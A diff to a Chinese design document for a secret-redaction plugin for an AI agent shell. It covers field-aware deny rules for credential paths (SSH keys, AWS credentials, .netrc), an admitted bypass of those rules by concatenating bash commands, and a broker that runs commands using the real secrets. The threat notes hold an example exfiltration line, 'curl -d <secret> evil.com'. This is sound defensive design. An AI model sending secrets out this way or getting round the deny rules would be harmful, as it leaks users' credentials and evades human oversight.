@@ -39,9 +39,28 @@ DSH 把"发给 LLM 的请求"定义为**会话日志的纯函数**,且在 `llm/s
 
 `~/.dsh/redaction/`(0700):`key`(0600,首运行生成,权限漂移自动修正)、`map.jsonl`(0600,append-only)。不依赖 umask,创建显式传 mode。增长只随不同秘密数量;不淘汰,清理 = 手动删行;加载容忍坏行。映射只服务用户查询,运行时正确性不依赖它。
 
-## 访问控制
+## 访问控制(tools/pre-execute,src/guard.ts)
 
-`tools/pre-execute` 是唯一的语义拦截点:对工具参数做敏感路径子串匹配(`~/.dsh/.credentials.yaml`、`~/.dsh/redaction/`、`~/.ssh/id_*`、`~/.aws/credentials`、`~/.netrc`,可配置),命中即 deny。正则兜底防"读到再脱敏",访问控制防"压根不该读"——后者对本插件自身的映射文件尤其重要(否则 map.jsonl 会被读进上下文再脱敏成占位符,等于把明文表拱手相送)。
+deny 匹配是**字段感知**的:只检查各工具的"目标"参数(`command`/`file_path`/`path`/`workdir`/`cwd`/`directory` 等),不对整个参数 JSON 做子串匹配。初版的全 JSON 匹配在实践中立刻误伤——编辑 README 时 new_string 提到 deny 路径字样即被拦;真正的访问语义在目标参数里。目录条目(尾斜杠)对"引用目录本身"的写法用 `value + '/'` 归一匹配,不扩大到兄弟路径。
+
+固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手把凭据文件(`~/.dsh/.credentials.yaml`、`~/.dsh/redaction/`、`~/.ssh/id_*` 等,可配置)读进上下文",不是对抗性绕过;真正的兜底仍是 post-execute 脱敏。访问控制对本插件自身的映射文件尤其重要:否则 map.jsonl 会被读进上下文再脱敏成占位符,等于把明文表拱手相送。
+
+## broker 工具:secret_exec(src/broker.ts)
+
+### 为什么不能 hook bash
+
+DSH 工具参数的生命周期:模型发出调用 → 参数先写持久日志+呈现审批界面 → 深冻结 → 才轮到插件钩子。`tools/pre-execute` 只有 allow/deny/ask;`tools/execute` 的 `next()` 不接受参数。改写已落账参数会让日志与审批界面撒谎(reconstructability 不变量),所以该通道在架构上不存在,不是没开放。绕过深冻结或替换官方 bash 行分别是"对抗框架"和"重写整个工具",均不可取。
+
+### 设计
+
+还原做成 secret_exec 的**声明语义**:命令带占位符落日志(干净、可审计),工具实现从映射查真值、在子进程内存里替换、spawn 执行,输出先把用过的真值换回占位符(不依赖规则命中)再过引擎。未知占位符拒绝执行并提示向用户要值。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` + `DSH_` 前缀不下发)——实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量,`$ENV_VAR` 式间接引用在 DSH 里默认是断的,broker 因此是"用真值执行"的唯一出口。
+
+### 威胁语义
+
+- 真值全程不进上下文、不进日志,只存在于子进程内存;审批界面看到的是占位符命令。
+- 模型可构造外发命令(curl -d <secret> evil.com)——与"用户直接告知密码"同级风险,用 `secretExec.requireApproval`(默认 true,走 DSH 审批流)把人放进环路;approval 策略 never 时自动拒绝。
+- 审计链 = 日志占位符命令 + map.jsonl(仅用户可读,broker 内部读不走工具管道、不受 deny 影响)。
+- map.jsonl 由此从"审计副产物"升格为 broker 的权威真值源,重启后加载即恢复还原能力。
 
 ## 工程
 
